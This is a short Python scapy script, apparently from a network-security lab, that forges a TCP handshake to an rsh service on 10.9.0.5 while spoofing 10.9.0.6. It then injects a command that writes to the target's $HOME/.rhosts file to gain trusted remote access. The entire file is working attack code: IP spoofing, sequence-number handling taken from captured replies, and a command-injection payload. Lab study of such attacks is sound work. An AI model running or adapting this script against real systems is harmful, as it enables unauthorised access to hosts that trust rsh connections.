import scapy.all as scapy
from arpspoof import get_iface

print("-----------------Manda pacote SYN-----------------")
pkt = scapy.IP(dst='10.9.0.5', src='10.9.0.6')/scapy.TCP(sport=514, dport=514, flags='S', seq=100)
# pkt.show()
rcvd = scapy.sr1(pkt, iface=get_iface(), verbose=False)
rcvd.show()

print("-----------------Manda pacote ACK-----------------")
pkt = scapy.IP(dst='10.9.0.5', src='10.9.0.6')/scapy.TCP(sport=514, dport=514, flags='A', seq=101, ack=rcvd.seq + 1)
# pkt.show()
rcvd = scapy.sr1(pkt, iface=get_iface(), verbose=False)
rcvd.show()

## CONEXAO ABERTA!!!!
print("-----------------Manda pacote RSH-----------------")
data = 'echo "aaa" > $HOME/.rhosts'
pkt = scapy.IP(dst='10.9.0.5', src='10.9.0.6')/scapy.TCP(sport=514, dport=514, flags='A', seq=102, ack=rcvd.seq + 1) / scapy.Raw(load=data)
# pkt.show()
rcvd = scapy.sr1(pkt, iface=get_iface(), verbose=False)
rcvd.show()